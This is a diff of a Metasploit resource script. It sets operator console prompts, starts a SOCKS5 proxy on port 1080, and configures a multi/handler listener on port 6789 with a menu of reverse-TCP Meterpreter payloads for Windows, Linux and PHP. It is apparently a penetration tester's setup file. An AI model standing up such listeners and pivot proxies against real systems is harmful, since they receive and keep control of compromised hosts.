@@ -1,22 +1,30 @@
-set Prompt [Knight Operation Console]
-set MeterpreterPrompt [Knight Enemy]
+set Prompt [Meterpreter Operator Console]
+set MeterpreterPrompt [Meterpreter Beacon]
 
 # custom for your love
 
-setg payload windows/meterpreter/reverse_tcp
-# setg RHOSTS 114.5.1.4
+# auto set up the socks proxy
+use auxiliary/server/socks_proxy
+set SRVPORT 1080
+set VERSION 5
+# run -j
 
 use multi/handler
+# Choose one of your payload
 # set payload windows/meterpreter/reverse_tcp
+# set payload windows/x64/meterpreter/reverse_tcp
+# set payload linux/x86/meterpreter/reverse_tcp
+# set payload linux/x64/meterpreter/reverse_tcp
+# set payload php/meterpreter/reverse_tcp
+# set payload generic/shell_reverse_tcp
+
 set ExitOnSession false
 set LHOST 0.0.0.0 
 set LPORT 6789
 
-# uncomment this for Automatically creating a job listener background with multi listeners
 # run -j
+# Other payloads
 # set payload linux/x64/meterpreter/reverse_tcp
 # set LPORT 6790
 # 
-
-# uncomment this for Automatically creating a job listener background
 # run -j 
